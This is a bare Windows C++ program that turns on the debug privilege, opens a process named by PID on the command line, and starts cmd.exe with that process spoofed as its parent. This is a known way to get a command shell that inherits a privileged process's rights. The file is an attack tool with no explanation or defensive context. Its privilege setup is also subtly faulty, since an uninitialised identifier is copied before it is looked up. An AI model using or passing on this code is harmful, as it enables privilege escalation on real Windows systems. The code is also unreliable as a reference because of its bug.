#include <windows.h>
#include <stdio.h>
#include <iostream>

BOOL setPrivilege(LPCTSTR priv) {
  HANDLE token;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL res = TRUE;
  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
  return res;
}

BOOL createProcess(DWORD pid, LPCWSTR app) {
  STARTUPINFOEXW si;
  PROCESS_INFORMATION pi;
  SIZE_T size;
  BOOL res = TRUE;
  HANDLE ph = OpenProcess(PROCESS_CREATE_PROCESS, false, pid);
  ZeroMemory(&si, sizeof(STARTUPINFOEXW));
  ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
  InitializeProcThreadAttributeList(NULL, 1, 0, &size);
  si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
  InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
  UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);
  si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
  res = CreateProcessW(app, NULL, NULL, NULL, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
  return res;
}

int main(int argc, char** argv) {
  if (!setPrivilege(SE_DEBUG_NAME)) return -1;
  DWORD pid = atoi(argv[1]);
  if (!createProcess(pid, L"C:\\Windows\\system32\\cmd.exe")) return -1;
  return 0;
}
